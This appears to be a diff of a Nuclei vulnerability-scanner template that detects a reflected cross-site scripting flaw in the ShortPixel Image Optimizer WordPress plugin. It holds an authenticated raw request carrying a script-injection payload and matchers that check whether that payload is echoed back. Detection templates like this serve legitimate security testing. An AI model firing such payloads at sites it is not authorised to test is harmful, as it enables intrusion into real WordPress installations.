@@ -1,4 +1,5 @@
 id: shortpixel-image-optimizer-xss
+
 info:
   name: ShortPixel Image Optimizer < 4.22.10 - Reflected Cross-Site Scripting
   author: Akincibor
@@ -10,6 +11,7 @@ info:
   metadata:
     verified: true
   tags: xss,wp-plugin,wp,wordpress,shortpixel,authenticated
+
 requests:
   - raw:
       - |
@@ -23,6 +25,7 @@ requests:
       - |
         GET /wp-admin/options-general.php?page=wp-shortpixel-settings&"><script>alert(1)</script> HTTP/1.1
         Host: {{Hostname}}
+
     cookie-reuse: true
     matchers-condition: and
     matchers:
@@ -30,10 +33,12 @@ requests:
         part: body
         words:
           - '&\"><script>alert(1)</script>&noheader=true&sp-action'
+
       - type: word
         part: header
         words:
           - text/html
+
       - type: status
         status:
           - 200
